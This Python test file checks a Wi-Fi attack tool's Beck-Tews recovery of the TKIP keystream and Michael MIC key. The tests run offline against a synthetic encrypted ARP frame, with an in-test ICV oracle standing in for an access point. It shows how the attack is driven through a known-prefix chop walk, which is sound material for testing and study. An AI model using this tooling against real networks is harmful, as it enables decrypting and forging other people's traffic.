"""Beck-Tews recovery tests: pure software, no hardware.

Proves the keystream + Michael-key recovery against a synthetic TKIP frame built
under a known TK, Michael key and TSC: the chop walk is driven by an in-test
oracle that fires exactly when a guess yields a valid ICV (the offline stand-in
for the AP's MIC-failure report).
"""
import zlib

from wifang.campaigns.tkip.campaign import _KNOWN_ARP_PREFIX
from wifang.crack.tkip_beck_tews import BeckTewsWalk, Recovered, recover
from wifang.crack.wep import rc4_keystream
from wifang.dot11.michael import michael
from wifang.dot11.tkip import tkip_rc4_key
from wifang.dot11.wep.crypto import CRC32_RESIDUE, icv

_KNOWN_ARP16 = bytes([
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
    0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01,
])

_TK = bytes(range(16))
_MIC_KEY = bytes.fromhex("0102030405060708")
_DA = bytes.fromhex("ffffffffffff")
_SA = bytes.fromhex("aabbccddeeff")
_PRIORITY = 0
_TSC = 0x0000000000AB


def _xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def _michael_input(payload: bytes) -> bytes:
    return _DA + _SA + bytes([_PRIORITY]) + b"\x00\x00\x00" + payload


def _synth_tkip_arp():
    """A TKIP-encrypted ARP MSDU under the known key material: returns the
    ciphertext body (payload || MIC || ICV, all RC4'd) and its keystream."""
    payload = _KNOWN_ARP16 + bytes.fromhex("c0a80101000000000000c0a80102")
    mic = michael(_MIC_KEY, _michael_input(payload))
    plaintext = payload + mic
    full = plaintext + icv(plaintext)
    keystream = rc4_keystream(tkip_rc4_key(_TK, _SA, _TSC), len(full))
    return _xor(full, keystream), keystream


def _icv_oracle(keystream: bytes):
    async def probe(candidate: bytes) -> bool:
        plain = _xor(candidate, keystream)
        return (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE

    return probe


async def test_recovers_keystream_and_mic_key_from_synthetic_tkip_frame():
    cipher, keystream = _synth_tkip_arp()
    rec = await recover(
        cipher, _KNOWN_ARP16, probe=_icv_oracle(keystream),
        da=_DA, sa=_SA, priority=_PRIORITY, tsc=_TSC,
    )
    assert isinstance(rec, Recovered)
    assert rec.mic_key == _MIC_KEY
    assert rec.keystream == keystream
    assert rec.keystream[:16] == _xor(cipher[:16], _KNOWN_ARP16)
    assert rec.tsc == _TSC


async def test_recovers_arp_request_under_campaign_floor():
    """The captured AP->client frame is an ARP REQUEST (op=1); the campaign's floor
    must not assume the opcode byte, so recovery under it must still be exact."""
    cipher, keystream = _synth_tkip_arp()
    rec = await recover(
        cipher, _KNOWN_ARP_PREFIX, probe=_icv_oracle(keystream),
        da=_DA, sa=_SA, priority=_PRIORITY, tsc=_TSC,
    )
    assert rec.mic_key == _MIC_KEY
    assert rec.keystream == keystream


def test_walk_stops_at_known_prefix_floor():
    cipher, keystream = _synth_tkip_arp()
    walk = BeckTewsWalk(cipher, _KNOWN_ARP16)
    while not walk.done:
        frame = walk.next_guess_frame()
        plain = _xor(frame, keystream)
        fired = (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE
        walk.on_oracle(fired)
    assert walk.bytes_done == len(cipher) - len(_KNOWN_ARP16)
    assert walk.next_guess_frame() == b""
